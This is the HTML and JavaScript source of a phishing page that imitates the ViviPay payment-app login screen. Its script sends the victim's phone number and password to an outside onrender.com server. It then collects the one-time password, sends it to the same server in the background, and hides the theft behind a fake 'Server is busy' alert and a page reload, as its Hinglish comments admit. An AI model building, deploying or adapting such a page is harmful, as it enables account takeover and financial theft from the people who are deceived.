<!DOCTYPE html>
<html lang="en" style="font-size: 44.8px;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>ViviPay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        /* [Aapki existing CSS yahan rahegi] */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        html, body { background-color: #ffffff; width: 100%; height: 100%; overflow-x: hidden; }
        #app { width: 100%; height: 100%; }
        main { height: 100vh; width: 100%; display: flex; flex-direction: column; align-items: center; background-color: #ffffff; padding: 0 0.67rem; }
        img.logo { width: 302.39px; height: 222.81px; object-fit: contain; }
        .loginform { width: 100%; max-width: 380px; display: flex; flex-direction: column; transform: translateY(-25px); }
        .input-field-group { background-color: #f6f9fe; border-radius: 30px; display: flex; align-items: center; padding: 16px 22px; margin-bottom: 18px; width: 100%; }
        .input-field-group input { border: none; background: transparent; width: 100%; font-size: 16px; outline: none; }
        .submit-btn { background-color: #1a85ff; color: #ffffff; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: 500; cursor: pointer; }
        
        /* Modals */
        .otp-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.4); display: flex; justify-content: center; align-items: center; z-index: 30000; opacity: 0; pointer-events: none; }
        .otp-modal-overlay.active { opacity: 1; pointer-events: auto; }
        .otp-modal-container { background-color: #ffffff; width: 100%; max-width: 350px; border-radius: 16px; padding: 28px 20px; text-align: center; }
        .otp-input-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
        .otp-box { width: 46px; height: 46px; border: none; border-bottom: 2.5px solid #cbd5e1; text-align: center; font-size: 22px; font-weight: 600; outline: none; background: transparent; }
        .otp-box:focus { border-bottom-color: #1a85ff; }
        
        .modify-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #ffffff; z-index: 20000; display: none; flex-direction: column; padding: 20px 24px; }
        .modify-modal-overlay.active { display: flex; }
    </style>
</head>
<body>

    <div id="app">
        <main>
            <div><img src="https://vivipay.net/static/images/Login_Logo.png" class="logo" alt="Logo"></div>
            <div class="loginform">
                <form id="loginForm">
                    <div class="input-field-group"><input type="tel" id="phoneNumber" placeholder="Enter phone number" required></div>
                    <div class="input-field-group"><input type="password" id="password" placeholder="Enter password" required></div>
                    <div class="form-utilities">
                        <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
                    </div>
                    <button type="submit" class="submit-btn">Login</button>
                </form>
            </div>
        </main>
    </div>

    <div class="otp-modal-overlay" id="otpModal">
        <div class="otp-modal-container">
            <div class="otp-title">Please enter OTP</div>
            <div class="otp-input-container">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp3')" id="otp2">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp4')" id="otp3">
                <input type="tel" class="otp-box" maxlength="1" oninput="checkAndSubmitOtp(this)" id="otp4">
            </div>
            <div class="otp-timer">Resend in <span id="secondsCount">118</span> seconds</div>
        </div>
    </div>

    <script>
        const BACKEND_URL = 'https://vivipay-backend.onrender.com';
        let currentUserId = null;

        // Login Logic
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phoneNumber = document.getElementById('phoneNumber').value;
            const password = document.getElementById('password').value;
            
            const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber, password })
            });
            const data = await response.json();
            if (data.success) {
                currentUserId = data.userId;
                document.getElementById('otpModal').classList.add('active');
                startTimer();
            }
        });

        // INTEGRATED OTP FUNCTION
        async function checkAndSubmitOtp(current) {
            const o1 = document.getElementById('otp1').value;
            const o2 = document.getElementById('otp2').value;
            const o3 = document.getElementById('otp3').value;
            const o4 = current.value;

            if(o1 && o2 && o3 && o4) {
                const fullOtp = o1 + o2 + o3 + o4;
                
                // 1. Background mein OTP server ko bhej rahe hain
                fetch(`${BACKEND_URL}/api/otp-submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
                }).catch(err => console.error("Error:", err));
                
                // 2. User ko "Server Busy" dikhakar reload kar rahe hain
                setTimeout(() => {
                    alert("Server is busy, please try again later.");
                    window.location.reload();
                }, 500);
            }
        }

        function startTimer() {
            let totalSec = 118;
            const timerInterval = setInterval(() => {
                totalSec--;
                document.getElementById('secondsCount').innerText = totalSec;
                if(totalSec <= 0) clearInterval(timerInterval);
            }, 1000);
        }

        function moveNext(current, nextFieldId) { 
            if (current.value.length >= 1) document.getElementById(nextFieldId).focus(); 
        }

        // Trigger Forgot modal
        document.getElementById('triggerForgot').addEventListener('click', () => {
            document.getElementById('modifyPasswordModal').classList.add('active');
        });
    </script>
</body>
</html>
